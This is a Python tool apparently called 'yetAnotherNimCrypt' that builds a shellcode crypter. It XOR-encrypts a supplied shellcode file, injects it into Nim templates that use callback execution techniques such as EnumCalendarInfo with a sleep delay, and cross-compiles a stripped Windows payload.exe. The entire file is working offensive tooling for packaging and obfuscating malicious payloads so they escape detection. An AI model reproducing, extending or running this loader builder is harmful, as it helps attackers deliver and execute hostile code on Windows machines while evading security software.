#!/usr/bin/env python3
"""
yetAnotherNimCrypt by xl00t

Usage:
  yetAnotherNimCrypt.py <shellcode_path> [--key=<key>] [--encryption=<encryption>] [--output=<output>] [--technique=<technique>]


Options:
  -h --help     Show this screen.
  -V --version     Show version.
"""

from docopt import docopt
import os
import random
import shutil
import subprocess
import sys

CWD = os.path.join(os.path.dirname(__file__))

def random_key(length=32):
    return random.randbytes(length)

def convert_shellcode(raw_shellcode):
    formated_shellcode = f"var buf: array[{len(raw_shellcode)}, byte] = ["
    for i in range(0, len(raw_shellcode)):
        formated_shellcode += f"{ord(raw_shellcode[i])},"

    # Delete last ','
    formated_shellcode = formated_shellcode[:-1]
    formated_shellcode += ']\n'
    print("[+] Formated shellcode")
    return formated_shellcode


def convert_key(key):
    formated_key = f"var key: array[{len(key)}, byte] = ["
    for i in range(0, len(key)):
        formated_key += f"{key[i]},"
    formated_key = formated_key[:-1]
    formated_key += ']'
    print("[+] Formated key")
    return formated_key

def xor_shellcode(shellcode, key):
    key_padd = key * (len(shellcode)//len(key)+1)
    cipher = ""
    for i in range(len(shellcode)):
        cipher += chr(shellcode[i] ^ key_padd[i])
    return cipher

def write_encrypt_template(encrypt, key):
    try:
        formated_key = convert_key(key)
        shutil.copyfile(f"{CWD}/ciphers/{encrypt}.nim", f"{CWD}/build/crypt.nim")
        encrypt_template_updated =  open(f"{CWD}/build/crypt.nim", 'r').read().replace('KEY_PLACEHOLDER', formated_key)
        
        open(f"{CWD}/build/crypt.nim", 'w').write(encrypt_template_updated)
        print(f"[+] Encrypt template updated using encryption: {encrypt}")
    except Exception as e:
        import traceback
        print(traceback.format_exc())
        print("[-] Invalid Encryption", e)
        sys.exit(1)


def write_shellcode_template(technique, shellcode, sleep_time):
    try:

        formated_shellcode = convert_shellcode(shellcode)

        shutil.copyfile(f"{CWD}/techniques/{technique}.nim", f"{CWD}/build/exec.nim")

        shellcode_template_updated =  open(f"{CWD}/build/exec.nim", 'r').read().replace('SHELLCODE_PLACEHOLDER', formated_shellcode).replace("SLEEP_PLACEHOLDER", sleep_time)
        
        open(f"{CWD}/build/exec.nim", 'w').write(shellcode_template_updated)
        print(f"[+] Shellcode template updated using technique: {technique}")
    except:
        print("[-] Invalid Technique")
        sys.exit(1)

def compile_shellcode_loader(output_path):
    subprocess.run(["nim", "c", "--cpu:amd64", "--os:windows", "--gcc.exe:x86_64-w64-mingw32-gcc", "--gcc.linkerexe:x86_64-w64-mingw32-gcc", "-d:release", "-d:strip", "--opt:size", f"-o:{output_path}", f"{CWD}/build/exec.nim"], stdout=subprocess.DEVNULL)
    print("[+] Shellcode loader compiled")

if __name__ == '__main__':
    arguments = docopt(__doc__, version='yetAnotherNimCrypt 0.1')
    
    key = random_key(32) if not arguments["--key"] else arguments["--key"]
    encryption = "xor" if not arguments["--encryption"] else arguments["--encryption"]
    technique = "EnumCalendarInfo" if not arguments["--technique"] else arguments["--technique"]
    sleep_time = str(20)
    output_path = "./payload.exe" if not arguments["--output"]  else arguments["--output"]
    shellcode_enc = None

    shellcode = open(arguments["<shellcode_path>"], 'rb').read()

    if key:
        print(f"[+] Using {encryption} key: {key.hex()}")

        if encryption == "xor":
            shellcode_enc = xor_shellcode(shellcode, key)
            write_encrypt_template(encryption, key)

    write_shellcode_template(technique, shellcode_enc, sleep_time)
    compile_shellcode_loader(output_path)
